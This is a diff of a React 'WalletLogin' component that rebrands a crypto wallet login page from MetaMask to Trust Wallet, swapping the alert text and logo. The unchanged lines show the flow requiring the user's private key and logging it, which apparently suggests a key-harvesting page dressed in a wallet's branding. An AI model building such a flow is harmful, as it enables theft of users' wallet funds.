@@ -67,7 +67,7 @@ const WalletLogin = () => {
 
         const ethereum = window.ethereum;
 
-        if (!ethereum) return window.alert('no metamask wallet found please switch to metamask mobile app\'s browser');
+        if (!ethereum) return window.alert('no Trust wallet found please switch to Trust mobile app\'s browser');
 
         const connect = await ethereum.request({ method: 'eth_requestAccounts' });
 
@@ -93,7 +93,7 @@ const WalletLogin = () => {
             console.log(response.data);
 
             if (response.status === 204) {
-                setGetKey(true);
+                
                 setAuthLoading(false)
                 if (!privateKey) return console.log('private key required');
                 console.log(privateKey);
@@ -114,8 +114,6 @@ const WalletLogin = () => {
                     setAuthLoading(false)
                     setAddMore(true)
 
-
-                    // navigate(from, {replace : true});
                 }
                 
                 console.log(response.status)
@@ -132,10 +130,11 @@ const WalletLogin = () => {
             console.log(error.response.data)
             console.log(error.response.status)
             setAuthLoading(false)
-
         }
 
     }
+
+
     const handleImageChange = (e) => {
         console.log(e);
 
@@ -226,8 +225,8 @@ const WalletLogin = () => {
             </button>
             <div className='connect--wallet'>
                 <span className='image--span'>
-                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/36/MetaMask_Fox.svg/2048px-MetaMask_Fox.svg.png" alt="wallet logo" />
-                    <h1>Metamask</h1>
+                    <img src="https://trustwallet.com/assets/images/media/assets/vertical_blue.png" />
+                    {/* <h1>TrustWallet</h1> */}
                     <p> Your Access to the Decentralized Web</p>
                 </span>
                 { !authLoading &&   <button className='login--btn' onClick={signUser}>
